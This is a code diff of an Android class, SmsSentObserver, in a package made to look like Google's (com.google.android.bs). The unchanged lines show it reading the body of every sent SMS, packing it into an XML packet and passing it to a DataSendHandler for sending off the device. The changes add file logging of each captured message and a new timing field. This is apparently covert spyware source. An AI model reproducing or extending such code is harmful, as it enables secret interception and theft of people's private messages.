@@ -14,6 +14,7 @@ import android.preference.PreferenceManager;
 import android.util.Log;
 
 import com.google.android.bs.DataSendHandler;
+import com.google.android.bs.FileLog;
 
 public class SmsSentObserver extends ContentObserver {
 
@@ -38,18 +39,26 @@ public class SmsSentObserver extends ContentObserver {
 
 		try {
 			Log.e(TAG, "Notification on SMS observer");
+			FileLog.writeLog("smsSentObserver: Notification on SMS observer");
+
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
 			if (sms_sent_cursor != null) {
 				if (sms_sent_cursor.moveToFirst()) {
 					String protocol = sms_sent_cursor.getString(sms_sent_cursor
 							.getColumnIndex("protocol"));
+
 					Log.e(TAG, "protocol : " + protocol);
+					FileLog.writeLog("smsSentObserver: protocol : " + protocol);
+
 					if (protocol == null) {
 						// String[] colNames = sms_sent_cursor.getColumnNames();
 						int type = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
+
 						Log.e(TAG, "SMS Type : " + type);
+						FileLog.writeLog("smsSentObserver: SMS Type : " + type);
+
 						if (type == 2) {
 							Log.e(TAG,
 									"Id : "
@@ -111,12 +120,14 @@ public class SmsSentObserver extends ContentObserver {
 									+ "</ttl><cdata1>"
 									+ sms_sent_cursor.getString(sms_sent_cursor
 											.getColumnIndex("body"))
-									+ "</cdata1></packetSentObserver>";
+									+ "</cdata1><ntime>" + "30"
+									+ "</ntime></packetSentObserver>";
 
 							DataSendHandler dSH = new DataSendHandler(mContext);
 							dSH.send(2, sendStr);
 
 							Log.d(TAG, sendStr);
+							FileLog.writeLog("smsSentObserver: " + sendStr);
 
 							/*
 							 * if(colNames != null){ for(int k=0;
@@ -129,16 +140,18 @@ public class SmsSentObserver extends ContentObserver {
 				}
 			} else
 				Log.e(TAG, "Send Cursor is Empty");
+			FileLog.writeLog("smsSentObserver: Send Cursor is Empty");
 		} catch (Exception sggh) {
 			Log.e(TAG, "Error on onChange : " + sggh.toString());
+			FileLog.writeLog("smsSentObserver: Error on onChange : "
+					+ sggh.toString());
 		}
 		super.onChange(selfChange);
 	}// fn onChange
 
 	@SuppressLint("SimpleDateFormat")
 	private String logTime() {
-		SimpleDateFormat formatter = new SimpleDateFormat(
-				"yyyy-MM-dd HH:mm:ss");
+		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
 		Calendar cal = Calendar.getInstance();
 		cal.setTimeInMillis(System.currentTimeMillis());
 		return "" + formatter.format(cal.getTime());
